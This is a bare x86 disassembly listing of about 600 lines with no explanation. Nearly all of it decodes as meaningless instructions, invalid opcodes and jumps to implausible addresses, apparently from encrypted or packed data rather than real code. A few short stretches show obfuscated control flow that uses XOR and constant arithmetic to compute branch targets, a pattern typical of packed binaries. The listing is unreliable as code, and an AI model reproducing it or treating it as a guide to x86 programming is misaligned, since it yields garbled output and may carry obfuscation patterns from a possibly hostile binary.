  40d359:	mov    esp,0x3ea90d63
  40d35e:	aam    0x7e
  40d360:	enter  0xbdfa,0x5c
  40d364:	mov    edx,0x81f561b0
  40d369:	test   DWORD PTR [edi],esp
  40d36b:	test   eax,0x5a543296
  40d370:	xor    ch,BYTE PTR [edi+0x38fdb81f]
  40d376:	xchg   edi,eax
  40d377:	push   0x8f3017cf
  40d37c:	mov    esi,0x3754dbc7
  40d381:	dec    ebx
  40d382:	or     DWORD PTR [edi+0x56ca87df],esi
  40d388:	mov    dl,ch
  40d38a:	jb     0x40d363
  40d38c:	pop    esp
  40d38d:	lods   eax,DWORD PTR ds:[esi]
  40d38e:	lods   eax,DWORD PTR ds:[esi]
  40d38f:	or     esp,esp
  40d391:	mov    bl,0xf3
  40d393:	push   cs
  40d394:	mov    esp,0x2d1ee26e
  40d399:	or     DWORD PTR [ecx-0x40],ebx
  40d39c:	mul    BYTE PTR ds:0x262fd85b
  40d3a2:	or     eax,0x7d9c2860
  40d3a7:	lock out 0xac,eax
  40d3aa:	std    
  40d3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ac:	(bad)  
  40d3ad:	sub    cl,BYTE PTR [edi]
  40d3af:	loop   0x40d38a
  40d3b1:	pcmpgtb mm2,QWORD PTR [edi]
  40d3b4:	in     al,dx
  40d3b5:	inc    ebp
  40d3b6:	test   esp,ebx
  40d3b8:	stc    
  40d3b9:	or     al,0x10
  40d3bb:	stos   DWORD PTR es:[edi],eax
  40d3bc:	inc    ebx
  40d3bd:	dec    edi
  40d3be:	ds fwait
  40d3c0:	repz scas al,BYTE PTR es:[edi]
  40d3c2:	cmc    
  40d3c3:	(bad)  
  40d3c4:	jle    0x40d35c
  40d3c6:	mov    ebp,0x6178e777
  40d3cb:	stc    
  40d3cc:	std    
  40d3cd:	lods   eax,DWORD PTR ds:[esi]
  40d3ce:	stc    
  40d3cf:	div    DWORD PTR [ebx]
  40d3d1:	(bad)  
  40d3d2:	stos   DWORD PTR es:[edi],eax
  40d3d3:	push   eax
  40d3d4:	add    bh,al
  40d3d6:	cmp    DWORD PTR [esi-0x5],esp
  40d3d9:	inc    ecx
  40d3da:	inc    esp
  40d3db:	push   0x808a929c
  40d3e0:	cmp    DWORD PTR [edx+0x6f],esp
  40d3e3:	jmp    0xbe3f75bc
  40d3e8:	adc    DWORD PTR [ebx],ebx
  40d3ea:	mov    edi,DWORD PTR [edi+esi*2]
  40d3ed:	std    
  40d3ee:	jo     0x40d3ce
  40d3f0:	fsubr  QWORD PTR [esi]
  40d3f2:	jno    0x40d396
  40d3f4:	xor    dl,dh
  40d3f6:	mov    ds:0x92b089d6,eax
  40d3fb:	stos   DWORD PTR es:[edi],eax
  40d3fc:	and    eax,0x3697174e
  40d401:	inc    esp
  40d402:	jns    0x40d3e2
  40d404:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d405:	jne    0x40d3c9
  40d407:	pop    eax
  40d408:	pusha  
  40d409:	or     BYTE PTR [edx],dh
  40d40b:	cwde   
  40d40c:	clc    
  40d40d:	aaa    
  40d40e:	call   0x91a2:0xdfb30def
  40d415:	push   es
  40d416:	call   0x453fce35
  40d41b:	mov    al,0xe4
  40d41d:	jmp    0x8a21f0e
  40d422:	cmp    bl,al
  40d424:	stos   DWORD PTR es:[edi],eax
  40d425:	ror    DWORD PTR [eax],1
  40d427:	or     ecx,DWORD PTR [ebp+0x3]
  40d42a:	shl    BYTE PTR ds:0x7c60ef1f,1
  40d430:	pop    ebp
  40d431:	cmp    eax,0x1a6cb155
  40d436:	jge    0x40d48c
  40d438:	fisubr WORD PTR [eax+ebx*8]
  40d43b:	call   0xf5149b60
  40d440:	inc    DWORD PTR [ecx+0x2b]
  40d443:	ret    0x7770
  40d446:	and    al,0x80
  40d448:	add    al,0xf8
  40d44a:	int3   
  40d44b:	nop
  40d44c:	ds es pop edx
  40d450:	outs   dx,DWORD PTR ds:[esi]
  40d451:	rcr    BYTE PTR [eax-0x76],0x5a
  40d455:	mov    ebp,0xf6ccbd52
  40d45a:	push   ss
  40d45b:	dec    esp
  40d45c:	xor    BYTE PTR [ecx-0x39bcb9d5],bh
  40d462:	imul   edx,esi,0xffffff8a
  40d465:	std    
  40d466:	stos   BYTE PTR es:[edi],al
  40d467:	cwde   
  40d468:	adc    eax,0x1f984731
  40d46d:	adc    cl,BYTE PTR [ebx+0x41fac61f]
  40d473:	in     al,dx
  40d474:	fisubr DWORD PTR [edi+0x41]
  40d477:	dec    edi
  40d478:	jle    0x40d46f
  40d47a:	jae    0x40d4ba
  40d47c:	push   ebx
  40d47d:	dec    edi
  40d47e:	imul   eax,DWORD PTR [eax+0x16811711],0xffffff9c
  40d485:	out    dx,al
  40d486:	mov    ebx,DWORD PTR [ecx-0x1a]
  40d489:	dec    eax
  40d48a:	sub    eax,0x311b4aa1
  40d48f:	scas   al,BYTE PTR es:[edi]
  40d490:	out    0x3,al
  40d492:	leave  
  40d493:	iret   
  40d494:	mov    esi,0xc9d70a8e
  40d499:	mov    ch,0x8d
  40d49b:	test   ebp,ebx
  40d49d:	push   esp
  40d49e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d49f:	cld    
  40d4a0:	adc    DWORD PTR [ebp-0x6ae27f7c],eax
  40d4a6:	addr16 jns 0x40d43f
  40d4a9:	lock mov ebp,0xca529198
  40d4af:	jae    0x40d4d0
  40d4b1:	ins    BYTE PTR es:[edi],dx
  40d4b2:	adc    eax,0xf153a1d3
  40d4b7:	and    eax,DWORD PTR [ebx]
  40d4b9:	xor    DWORD PTR [esi],edx
  40d4bb:	in     al,0x6
  40d4bd:	test   eax,0x4015bb2d
  40d4c2:	jbe    0x40d4c0
  40d4c4:	mov    esi,0xfc663859
  40d4c9:	add    bh,dl
  40d4cb:	sbb    DWORD PTR [esi],esi
  40d4cd:	push   esi
  40d4ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4cf:	xchg   edi,eax
  40d4d0:	js     0x40d48d
  40d4d2:	cmp    bl,BYTE PTR [eax+edi*4]
  40d4d5:	lock sbb cl,ch
  40d4d8:	lds    edi,FWORD PTR [eax-0xb]
  40d4db:	(bad)  
  40d4dc:	add    DWORD PTR [ebx+0x3886e9d6],0xffffffd3
  40d4e3:	in     eax,dx
  40d4e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4e5:	xchg   edi,eax
  40d4e6:	gs jnp 0x40d501
  40d4e9:	dec    ebp
  40d4ea:	pop    esp
  40d4eb:	adc    dh,al
  40d4ed:	xchg   esi,eax
  40d4ee:	mov    esi,0x389d6d53
  40d4f3:	jmp    FWORD PTR [edx-0x26]
  40d4f6:	jg     0x40d50f
  40d4f8:	jmp    0x40d4bd
  40d4fa:	push   ds
  40d4fb:	pop    ebp
  40d4fc:	into   
  40d4fd:	xor    ah,BYTE PTR [esi]
  40d4ff:	jl     0x40d4a8
  40d501:	push   edi
  40d502:	loopne 0x40d54c
  40d504:	rcl    DWORD PTR [ecx],0x5c
  40d507:	mov    ecx,0x7029df67
  40d50c:	ficom  DWORD PTR [ebx+0x2ada68e5]
  40d512:	mov    BYTE PTR [esi-0x66],ah
  40d515:	dec    ebp
  40d516:	mov    ah,0xd0
  40d518:	cwde   
  40d519:	mov    gs,ecx
  40d51b:	gs inc ecx
  40d51d:	mov    edi,0x9d919702
  40d522:	test   DWORD PTR [ebx+0x6c7cd81b],esi
  40d528:	imul   edi,DWORD PTR es:[edx],0x410fed69
  40d52f:	(bad)
  40d532:	imul   edi,esp,0xffffffc1
  40d535:	aad    0xd8
  40d537:	repz retf 
  40d539:	ins    DWORD PTR es:[edi],dx
  40d53a:	cs cs popfw 
  40d53e:	push   esp
  40d53f:	call   0xcc80:0x6bb485a6
  40d546:	fist   DWORD PTR [ebp+0x15]
  40d549:	test   DWORD PTR [ecx+0x62846f19],0xd31142a4
  40d553:	adc    al,0x95
  40d555:	cmp    eax,0xf0dd19b6
  40d55a:	mov    esp,0x28bfaf12
  40d55f:	xor    ah,ch
  40d561:	(bad)  
  40d563:	fist   DWORD PTR [ecx-0x5a8da9cd]
  40d569:	lods   al,BYTE PTR ds:[esi]
  40d56a:	loope  0x40d599
  40d56c:	fsub   st(3),st
  40d56e:	adc    BYTE PTR [esi],dh
  40d570:	repz push esp
  40d572:	dec    edx
  40d573:	or     al,0x34
  40d575:	mov    bl,0x80
  40d577:	jge    0x40d5f2
  40d579:	dec    eax
  40d57a:	pop    ss
  40d57b:	or     BYTE PTR [esi-0x64],al
  40d57e:	or     BYTE PTR [edi+0x58ac27f6],al
  40d584:	ret    0x7a0d
  40d587:	fucomi st,st(6)
  40d589:	cmp    al,0xc2
  40d58b:	mov    dl,0xfc
  40d58d:	(bad)  
  40d58e:	push   0x46
  40d590:	mov    ds:0x7f6edc9f,al
  40d595:	push   ecx
  40d596:	(bad)  
  40d597:	jmp    eax
  40d599:	add    ecx,eax
  40d59b:	cmp    eax,0x51140b31
  40d5a0:	(bad)  
  40d5a1:	mov    bh,0xba
  40d5a3:	pop    esp
  40d5a4:	and    dl,ch
  40d5a6:	xchg   ecx,eax
  40d5a7:	xor    ecx,ecx
  40d5a9:	cmp    al,0x8d
  40d5ab:	mov    dh,0xa5
  40d5ad:	mov    ds:0xe1a4978b,eax
  40d5b2:	mov    dh,0x7d
  40d5b4:	and    DWORD PTR [ebp-0x564fc4ea],esi
  40d5ba:	pop    ebx
  40d5bb:	push   0xffffffbf
  40d5bd:	ror    BYTE PTR [ebx],0xa1
  40d5c0:	(bad)  
  40d5c1:	enter  0x2518,0x17
  40d5c5:	call   0x5136b1c2
  40d5ca:	sahf   
  40d5cb:	ficomp WORD PTR [eax-0x62]
  40d5ce:	xchg   esp,eax
  40d5cf:	ds jmp 0xc678fb14
  40d5d5:	sbb    DWORD PTR [edx+0x3a],ebx
  40d5d8:	nop
  40d5d9:	clc    
  40d5da:	stos   DWORD PTR es:[edi],eax
  40d5db:	pusha  
  40d5dc:	dec    ebx
  40d5dd:	nop
  40d5de:	mov    eax,0x8b02af0f
  40d5e3:	push   ebp
  40d5e4:	cld    
  40d5e5:	xor    edx,ecx
  40d5e7:	mov    ecx,DWORD PTR [ebp+0x8]
  40d5ea:	lea    ecx,[edx+ecx*1+0x32729b]
  40d5f1:	cmp    ecx,eax
  40d5f3:	je     0x40dfca
  40d5f9:	mov    edi,DWORD PTR [ebp-0x18]
  40d5fc:	mov    eax,DWORD PTR [ebp+0x8]
  40d5ff:	mov    edx,DWORD PTR [ebp+0x14]
  40d602:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d606:	mov    ecx,0x7510854
  40d60b:	xor    edx,edx
  40d60d:	xor    edi,ecx
  40d60f:	mov    esi,0x32729b
  40d614:	add    edi,esi
  40d616:	div    edi
  40d618:	mov    edx,DWORD PTR [ebp-0x4]
  40d61b:	jmp    0x40d93b
  40d620:	inc    ecx
  40d621:	stos   BYTE PTR es:[edi],al
  40d622:	push   ss
  40d623:	jmp    0x40d61a
  40d625:	jae    0x40d688
  40d627:	mov    al,0xbf
  40d629:	jo     0x40d5c5
  40d62b:	jecxz  0x40d5c2
  40d62d:	sub    dh,BYTE PTR [bx+di]
  40d630:	sub    edx,DWORD PTR [eax+0x7d7d7e7e]
  40d636:	jle    0x40d6b6
  40d638:	enter  0xc735,0x47
  40d63c:	mov    bh,0x0
  40d63e:	adc    DWORD PTR [edi-0x5a60924f],ecx
  40d644:	(bad)  
  40d645:	dec    edi
  40d646:	ja     0x40d652
  40d648:	pop    ebx
  40d649:	jmp    FWORD PTR [esi]
  40d64b:	cld    
  40d64c:	adc    al,0x56
  40d64e:	fwait
  40d64f:	pop    ecx
  40d650:	lea    edx,[eax]
  40d652:	jb     0x40d6a9
  40d654:	and    bh,BYTE PTR [ecx]
  40d656:	in     eax,0x29
  40d658:	loop   0x40d64d
  40d65a:	xor    eax,0x829a7b2
  40d65f:	mov    ecx,0x290bd8e2
  40d664:	add    eax,0x9ef969df
  40d669:	xlat   BYTE PTR ds:[ebx]
  40d66a:	bound  eax,QWORD PTR [esi-0x5]
  40d66d:	adc    al,BYTE PTR [esi]
  40d66f:	mov    ds:0xf181cf1e,al
  40d674:	popa   
  40d675:	les    esi,FWORD PTR [ecx]
  40d677:	loop   0x40d6ab
  40d679:	div    DWORD PTR [ecx-0x58940205]
  40d67f:	and    cl,BYTE PTR [ecx+0x434eba4]
  40d685:	fstp   st(4)
  40d687:	push   edx
  40d688:	adc    BYTE PTR [esp+ecx*1],al
  40d68b:	sub    ecx,eax
  40d68d:	jmp    0x40d6f0
  40d68f:	and    edi,DWORD PTR [esp+edx*8-0x1cac0eee]
  40d696:	dec    edi
  40d697:	fwait
  40d698:	jns    0x40d6bd
  40d69a:	jp     0x40d6b8
  40d69c:	add    esi,esi
  40d69e:	dec    ebx
  40d69f:	stc    
  40d6a0:	(bad)  
  40d6a3:	mov    dl,BYTE PTR [eax]
  40d6a5:	dec    ebp
  40d6a6:	jmp    0x40d6bc
  40d6a8:	scas   al,BYTE PTR es:[edi]
  40d6a9:	fnsave [eax]
  40d6ab:	mov    ah,0xb1
  40d6ad:	nop
  40d6ae:	bound  edx,QWORD PTR [ecx+0x75450bd4]
  40d6b4:	jne    0x40d6ea
  40d6b6:	pushf  
  40d6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6b8:	push   cs
  40d6b9:	inc    ebx
  40d6ba:	fld    QWORD PTR [eax]
  40d6bc:	mov    ebx,0x113e8f16
  40d6c1:	xor    cl,BYTE PTR [eax+0x2e369d2f]
  40d6c7:	arpl   WORD PTR [ebp+0x5298df6a],cx
  40d6cd:	jae    0x40d65e
  40d6cf:	fiadd  DWORD PTR [ecx+0x6de4ca00]
  40d6d5:	ins    BYTE PTR es:[edi],dx
  40d6d6:	add    edx,ebx
  40d6d8:	sbb    al,0xc1
  40d6da:	cmp    esp,DWORD PTR [edi]
  40d6dc:	cmp    al,0xb8
  40d6de:	cdq    
  40d6df:	sbb    al,0x96
  40d6e1:	retf   0xc8a
  40d6e4:	cmp    eax,0x6f43e713
  40d6e9:	or     ebp,0xffffffd5
  40d6ec:	cwde   
  40d6ed:	dec    edi
  40d6ee:	cdq    
  40d6ef:	cmp    al,0x1a
  40d6f1:	sub    BYTE PTR [esi+0x6e],dl
  40d6f4:	arpl   WORD PTR [edx-0x5c],si
  40d6f7:	call   0xde789731
  40d6fc:	faddp  st(3),st
  40d6fe:	add    bh,0x42
  40d701:	adc    al,0xe5
  40d703:	add    eax,ecx
  40d705:	and    al,dh
  40d707:	cmc    
  40d708:	push   edi
  40d709:	into   
  40d70a:	inc    ecx
  40d70b:	stc    
  40d70c:	inc    esi
  40d70d:	adc    BYTE PTR [edx-0x59],ch
  40d710:	add    eax,0x6a3fda3a
  40d715:	add    ebp,DWORD PTR [edi-0x24c46e34]
  40d71b:	xor    DWORD PTR [edi+0x501a3382],ebx
  40d721:	adc    al,0x74
  40d723:	cmp    al,0xe3
  40d725:	stos   BYTE PTR es:[edi],al
  40d726:	pop    edx
  40d727:	xchg   ebx,eax
  40d728:	xor    ch,BYTE PTR [edx+0x63c17874]
  40d72e:	push   eax
  40d72f:	pop    es
  40d730:	xor    BYTE PTR [ecx+0x4f340ba5],cl
  40d736:	hlt    
  40d737:	cdq    
  40d738:	(bad)  
  40d739:	ror    eax,cl
  40d73b:	(bad)  
  40d73c:	xor    eax,0xd8a22c28
  40d741:	cmp    esi,eax
  40d743:	imul   BYTE PTR [edi-0x4dbe9d40]
  40d749:	push   ds
  40d74a:	bswap  edi
  40d74c:	in     al,0xdf
  40d74e:	clc    
  40d74f:	(bad)  
  40d751:	push   0x24
  40d753:	test   ebp,0x4b95e4a5
  40d759:	xchg   edi,eax
  40d75a:	rcr    ebp,cl
  40d75c:	jge    0x40d71c
  40d75e:	jnp    0x40d6fb
  40d760:	ficomp WORD PTR [ecx-0x53452557]
  40d766:	mov    dl,0xcc
  40d768:	and    al,BYTE PTR ds:[esi+edi*1+0x4a]
  40d76d:	loopne 0x40d729
  40d76f:	mov    esp,0xb4c678ee
  40d774:	lock jle 0x40d70b
  40d777:	sti    
  40d778:	aad    0xe4
  40d77a:	ins    BYTE PTR es:[edi],dx
  40d77b:	(bad)  
  40d77c:	test   BYTE PTR [ebp-0x732ff7c2],0x59
  40d783:	(bad)
  40d787:	test   BYTE PTR [ecx],0xcc
  40d78a:	push   es
  40d78b:	sbb    al,0xb2
  40d78d:	xor    bl,BYTE PTR [ecx-0x60]
  40d790:	and    DWORD PTR [eax+ebp*1+0x33],edx
  40d794:	test   ax,0x57aa
  40d798:	jne    0x40d7e5
  40d79a:	sbb    BYTE PTR [edi],0xa6
  40d79d:	lahf   
  40d79e:	es sub ch,al
  40d7a1:	repz clc 
  40d7a3:	xchg   BYTE PTR ds:0x2c767592,ah
  40d7a9:	push   ebx
  40d7aa:	in     al,dx
  40d7ab:	in     al,dx
  40d7ac:	mov    esp,DWORD PTR [ecx-0x6112719c]
  40d7b2:	lahf   
  40d7b3:	add    BYTE PTR [ebx+0x6f],bl
  40d7b6:	sbb    ecx,DWORD PTR [ebx+0x18]
  40d7b9:	push   ss
  40d7ba:	cli    
  40d7bb:	adc    al,0x45
  40d7bd:	sti    
  40d7be:	stc    
  40d7bf:	sbb    esp,DWORD PTR [esi-0x8]
  40d7c2:	adc    DWORD PTR [edi+ebx*1],ebp
  40d7c5:	(bad)  
  40d7c6:	sbb    DWORD PTR [ebp-0x6],ecx
  40d7c9:	and    BYTE PTR [eax-0x6f44b79f],0xbb
  40d7d0:	mov    edx,0x6e66f73f
  40d7d5:	pop    ds
  40d7d6:	cmp    DWORD PTR ds:0xa0bd416d,edi
  40d7dc:	or     BYTE PTR [edx],cl
  40d7de:	jg     0x40d816
  40d7e0:	sbb    bh,BYTE PTR [edx+0x78ae393e]
  40d7e6:	xadd   DWORD PTR [ebx-0x15f5d839],eax
  40d7ed:	rcl    BYTE PTR [esi+0xae13963],1
  40d7f3:	(bad)  
  40d7f4:	mov    cl,0x87
  40d7f6:	sbb    bh,0xb1
  40d7f9:	push   esp
  40d7fa:	shr    BYTE PTR [eax+0x64],1
  40d7fd:	cld    
  40d7fe:	push   0x34
  40d800:	cld    
  40d801:	rcr    esi,0x35
  40d804:	(bad)  
  40d805:	pop    DWORD PTR [edi+0x67]
  40d808:	dec    eax
  40d809:	in     al,dx
  40d80a:	mov    ebp,0x5625ed69
  40d80f:	add    edi,DWORD PTR [esi]
  40d811:	aam    0xb5
  40d813:	in     eax,0x6e
  40d815:	addr16 sti 
  40d817:	scas   eax,DWORD PTR es:[edi]
  40d818:	pop    ebp
  40d819:	add    DWORD PTR [ebp-0x14],edi
  40d81c:	mov    cl,bh
  40d81e:	sub    edx,DWORD PTR [ecx-0x31]
  40d821:	adc    esi,esi
  40d823:	jg     0x40d862
  40d825:	mov    dl,0xda
  40d827:	mov    ah,0xa9
  40d829:	dec    edx
  40d82a:	sub    DWORD PTR [esi-0x74],edx
  40d82d:	sbb    DWORD PTR [ecx],0xffffffcc
  40d830:	scas   al,BYTE PTR es:[edi]
  40d831:	ins    BYTE PTR es:[edi],dx
  40d832:	cwde   
  40d833:	adc    DWORD PTR [edx-0x2f],0x3fec4691
  40d83a:	outs   dx,DWORD PTR ds:[esi]
  40d83b:	xchg   edi,eax
  40d83c:	not    edx
  40d83e:	outs   dx,DWORD PTR ds:[esi]
  40d83f:	and    al,0x27
  40d841:	xchg   DWORD PTR ds:0xfa0085a9,ebp
  40d847:	pusha  
  40d848:	pusha  
  40d849:	popf   
  40d84a:	mov    ds:0xf55df5a3,al
  40d84f:	xchg   ebx,edi
  40d851:	out    0xe5,eax
  40d853:	fst    QWORD PTR [edi-0x7b07e2d]
  40d859:	mov    bl,0xe9
  40d85b:	jecxz  0x40d8b4
  40d85d:	js     0x40d854
  40d85f:	add    eax,0xcfbb7e0d
  40d864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d865:	shr    edx,1
  40d867:	jo     0x40d8e3
  40d869:	or     cl,ch
  40d86b:	push   0x34
  40d86d:	add    eax,0xcb78bd81
  40d872:	scas   eax,DWORD PTR es:[edi]
  40d873:	cmc    
  40d874:	or     al,0x6c
  40d876:	pop    esi
  40d877:	(bad)  
  40d878:	(bad)  
  40d87a:	dec    edx
  40d87b:	add    dl,BYTE PTR [edx-0x46]
  40d87e:	outs   dx,DWORD PTR ds:[esi]
  40d87f:	push   esp
  40d880:	mov    esp,0x25103328
  40d885:	xchg   esp,eax
  40d886:	into   
  40d887:	pop    edi
  40d888:	push   es
  40d889:	aas    
  40d88a:	mov    ecx,ds
  40d88c:	fld    DWORD PTR [edx+0x7e]
  40d88f:	mov    ds:0x5460fb0f,eax
  40d894:	cmp    DWORD PTR ds:0x3b3988c,edi
  40d89a:	xor    dh,BYTE PTR [ecx-0x70]
  40d89d:	lahf   
  40d89e:	or     eax,0x563fb55a
  40d8a3:	or     eax,0x1055d664
  40d8a8:	outs   dx,DWORD PTR ds:[esi]
  40d8a9:	das    
  40d8aa:	or     edx,ebx
  40d8ac:	xchg   ebx,eax
  40d8ad:	xor    al,0xb
  40d8af:	int3   
  40d8b0:	fwait
  40d8b1:	loopne 0x40d8e9
  40d8b3:	dec    eax
  40d8b4:	dec    ecx
  40d8b5:	aas    
  40d8b6:	scas   al,BYTE PTR es:[edi]
  40d8b7:	stc    
  40d8b8:	dec    ebp
  40d8b9:	push   eax
  40d8ba:	sbb    ch,dl
  40d8bc:	loop   0x40d932
  40d8be:	inc    ecx
  40d8bf:	mov    eax,ds:0x4adcdb82
  40d8c4:	push   ss
  40d8c5:	pushf  
  40d8c6:	mov    esi,DWORD PTR [esi+0x51765b3]
  40d8cc:	fs fwait
  40d8ce:	xor    bh,bl
  40d8d0:	jne    0x40d8b6
  40d8d2:	retf   0xc2ca
  40d8d5:	ficom  DWORD PTR [esi]
  40d8d7:	inc    ecx
  40d8d8:	dec    ebp
  40d8d9:	mov    bh,0xe4
  40d8db:	stos   BYTE PTR es:[edi],al
  40d8dc:	jnp    0x40d8ba
  40d8de:	pop    ecx
  40d8df:	out    0x80,al
  40d8e1:	xchg   esi,ecx
  40d8e3:	mov    bl,0x1f
  40d8e5:	inc    ebp
  40d8e6:	scas   eax,DWORD PTR es:[edi]
  40d8e7:	add    ebp,eax
  40d8e9:	xchg   ebx,eax
  40d8ea:	into   
  40d8eb:	aad    0xc0
  40d8ed:	push   0xffffffb9
  40d8ef:	daa    
  40d8f0:	adc    cl,ch
  40d8f2:	push   cs
  40d8f3:	xlat   BYTE PTR ds:[ebx]
  40d8f4:	sub    al,0xd6
  40d8f6:	or     DWORD PTR [ecx+0x30ba2818],edi
  40d8fc:	sti    
  40d8fd:	pop    ebp
  40d8fe:	(bad)  [esi+0x76]
  40d901:	dec    esi
  40d902:	scas   eax,DWORD PTR es:[edi]
  40d903:	or     eax,0xb01fd651
  40d908:	inc    esp
  40d909:	xchg   DWORD PTR [eax],esi
  40d90b:	cmp    al,0x92
  40d90d:	jl     0x40d896
  40d90f:	pop    ds
  40d910:	jnp    0x40d966
  40d912:	inc    esp
  40d913:	fwait
  40d914:	mov    edi,0xcef95174
  40d919:	dec    ebp
  40d91a:	ds (bad) 
  40d91c:	test   eax,0x1d776348
  40d921:	in     eax,dx
  40d922:	inc    edi
  40d923:	loope  0x40d8ce
  40d925:	sbb    al,0xce
  40d927:	mov    DWORD PTR [ebp+0x48161f12],0x95eee176
  40d931:	xor    al,0x2c
  40d933:	add    esi,DWORD PTR [edx-0xe904a1c]
  40d939:	cdq    
  40d93a:	lods   eax,DWORD PTR ds:[esi]
  40d93b:	xor    edx,ecx
  40d93d:	lea    eax,[edx+eax*1+0x32729b]
  40d944:	jmp    0x40dc64
  40d949:	das    
  40d94a:	sub    BYTE PTR [ecx],0x25
  40d94d:	mov    cl,0xb5
  40d94f:	xor    edx,DWORD PTR [eax-0x2c802913]
  40d955:	arpl   WORD PTR [edi],sp
  40d957:	loop   0x40d911
  40d959:	ss lahf 
  40d95b:	jle    0x40d9db
  40d95d:	jge    0x40d9dc
  40d95f:	jle    0x40d9df
  40d961:	ss jge 0x40d97c
  40d964:	xchg   ecx,eax
  40d965:	add    dh,BYTE PTR ds:0x19ef09
  40d96b:	xor    al,0xc9
  40d96d:	fiadd  DWORD PTR [edx+0x7574379d]
  40d973:	jbe    0x40d9bf
  40d975:	std    
  40d976:	push   0x7b0aefcc
  40d97b:	or     al,0xbf
  40d97d:	adc    esi,ebp
  40d97f:	ds push ebx
  40d981:	mov    bl,BYTE PTR [ecx+0x47]
  40d984:	fadd   DWORD PTR [ebp+0x5a000921]
  40d98a:	adc    al,0x80
  40d98c:	pop    ecx
  40d98d:	(bad)  
  40d98e:	out    dx,al
  40d98f:	push   ecx
  40d990:	dec    ebp
  40d991:	icebp  
  40d992:	and    esi,eax
  40d994:	add    al,BYTE PTR [esi+edx*1]
  40d997:	push   es
  40d998:	shl    BYTE PTR [esi],0x29
  40d99b:	mov    cl,0x8f
  40d99d:	xchg   esi,eax
  40d99e:	sti    
  40d99f:	add    DWORD PTR [edx-0x747223ca],esp
  40d9a5:	retf   
  40d9a6:	xor    ah,BYTE PTR [ebx+0x6c]
  40d9a9:	add    BYTE PTR [ecx+0x2f],bl
  40d9ac:	and    al,0xa8
  40d9ae:	in     eax,0xd1
  40d9b0:	push   esp
  40d9b1:	or     dh,cl
  40d9b3:	sbb    edx,edx
  40d9b5:	dec    edi
  40d9b6:	pop    edi
  40d9b7:	sbb    bl,bh
  40d9b9:	aaa    
  40d9ba:	jae    0x40d98b
  40d9bc:	(bad)  
  40d9be:	and    DWORD PTR [ecx*4-0x6e7154a],0xffffffb0
  40d9c6:	(bad)  
  40d9c7:	pop    edx
  40d9c8:	mov    dl,0x71
  40d9ca:	pop    edx
  40d9cb:	jmp    0x26b8058a
  40d9d0:	pop    edx
  40d9d1:	sbb    edi,DWORD PTR [edi+0x5]
  40d9d4:	daa    
  40d9d5:	and    BYTE PTR [eiz*4-0x432148ea],ch
  40d9dc:	jnp    0x40d9da
  40d9de:	mov    ds:0xdfc46056,al
  40d9e3:	jmp    0x5da77578
  40d9e8:	pop    ecx
  40d9e9:	out    0xc3,eax
  40d9eb:	retfw  0xb9ae
  40d9ef:	jge    0x40da30
  40d9f1:	retf   
  40d9f2:	fsub   QWORD PTR [edx+edi*8+0x46]
  40d9f6:	pop    edx
  40d9f7:	and    BYTE PTR [ebx+esi*4+0x27],ch
  40d9fb:	popf   
  40d9fc:	xchg   DWORD PTR ds:0x5fdaf485,edi
  40da02:	fmul   DWORD PTR [ecx+0xd]
  40da05:	jns    0x40da50
  40da07:	mov    ch,0x81
  40da09:	and    al,0x25
  40da0b:	sbb    al,cl
  40da0d:	lahf   
  40da0e:	dec    esi
  40da0f:	test   eax,0x8cd595fb
  40da14:	fcomp  QWORD PTR cs:[ebp+ebp*1+0x678d12af]
  40da1d:	mov    eax,ds:0xf758781
  40da22:	cmp    al,0x75
  40da24:	xchg   ebp,eax
  40da25:	lods   eax,DWORD PTR ds:[esi]
  40da26:	push   0xffffffad
  40da28:	not    BYTE PTR [ecx+0x512f7af2]
  40da2e:	add    eax,0x259dd8ae
  40da33:	push   ecx
  40da34:	pop    ecx
  40da35:	add    BYTE PTR [eax+0x17e2c259],0xbf
  40da3c:	and    cl,0x59
  40da3f:	dec    ebp
  40da40:	mov    DWORD PTR ds:0x64d6ca2f,ebp
  40da46:	mov    al,ds:0x4779c9fb
  40da4b:	inc    ebx
  40da4c:	sub    eax,0xf4aed3a3
  40da51:	jmp    0x40da8d
  40da53:	(bad)  
  40da54:	push   ds
  40da55:	inc    esi
  40da56:	mov    ah,0xa1
  40da58:	sti    
  40da59:	mov    ds,WORD PTR [eax+esi*4+0x7368a501]
  40da60:	repnz fisttp QWORD PTR [edi-0x4603d46f]
  40da67:	jae    0x40da49
  40da69:	jmp    0x2309563c
  40da6e:	mov    edx,0xe9a12df7
  40da73:	sbb    ch,BYTE PTR [edx+0x47]
  40da76:	fs sbb al,0x5f
  40da79:	(bad)  
  40da7b:	fsqrt  
  40da7d:	xchg   BYTE PTR [eax-0x3ce80df6],cl
  40da83:	adc    al,0xd3
  40da85:	ja     0x40daf4
  40da87:	in     eax,0x3e
  40da89:	push   cs
  40da8a:	(bad)  
  40da8b:	or     ebp,ebx
  40da8d:	xchg   ebx,eax
  40da8e:	test   eax,0x2c565475
  40da93:	xchg   BYTE PTR [esp+esi*4+0x74b7b9f6],bh
  40da9a:	in     eax,dx
  40da9b:	(bad)  
  40da9c:	stc    
  40da9d:	mov    ds:0x98d2d6da,eax
  40daa2:	sbb    ch,BYTE PTR [ecx]
  40daa4:	retf   
  40daa5:	rcl    DWORD PTR [ebx],cl
  40daa7:	add    DWORD PTR [ebx+0x45945562],0x39
  40daae:	pop    es
  40daaf:	jmp    0x40da89
  40dab1:	out    dx,al
  40dab2:	sub    DWORD PTR [eax+0x47a1e117],0x4
  40dab9:	mov    cl,0x90
  40dabb:	xor    bh,BYTE PTR [eax]
  40dabd:	xor    ah,BYTE PTR [ebx-0x62]
  40dac0:	fisttp DWORD PTR fs:[edx]
  40dac3:	or     BYTE PTR [edx+0x5d],al
  40dac6:	inc    ebp
  40dac7:	fmulp  st(6),st
  40dac9:	(bad)  
  40dacb:	ja     0x40dae9
  40dacd:	popa   
  40dace:	sbb    al,0x6c
  40dad1:	les    esp,FWORD PTR [ecx+edx*2+0x5]
  40dad5:	clc    
  40dad6:	pop    ss
  40dad7:	xor    BYTE PTR [ebp-0x37c3ccce],bl
  40dadd:	inc    esp
  40dade:	mov    ah,0x55
  40dae0:	push   ebp
